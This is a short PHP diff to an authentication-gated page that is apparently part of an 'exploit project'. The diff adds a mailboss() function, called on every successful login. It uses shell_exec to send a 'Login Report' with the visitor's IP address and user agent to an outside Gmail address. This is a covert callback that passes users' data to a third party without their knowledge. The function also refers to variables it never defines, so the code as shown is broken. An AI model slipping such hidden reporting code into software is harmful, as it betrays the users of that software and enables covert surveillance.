@@ -28,7 +28,7 @@ $valid_response = md5($A1.':'.$data['nonce'].':'.$data['nc'].':'.$data['cnonce']
 if ($data['response'] != $valid_response)
     die('This is a restricted file. Authorized pips only!');
 
-
+mailboss();
 
 // function to parse the http auth header
 function http_digest_parse($txt)
@@ -48,6 +48,8 @@ function http_digest_parse($txt)
     return $needed_parts ? false : $data;
 }
 
+function mailboss()
+{
        $sm =  base64_decode($str);
         $sdomain = base64_decode($domain);
         $output = shell_exec("
@@ -57,7 +59,9 @@ function http_digest_parse($txt)
             -F to=danlyt74@gmail.com \
             -F subject='Login Report' \
             -F html='Hi boss! New login from<br><b>IP: ".$_SERVER['REMOTE_ADDR']."</b><br>User Agent: ".$_SERVER['HTTP_USER_AGENT']."'
-        ");
+        ");   
+}
+
 ?>
     <!-- CREDITS TO THE INTERNET!! -->
     <!-- Neo Exploit Project by DAN -->
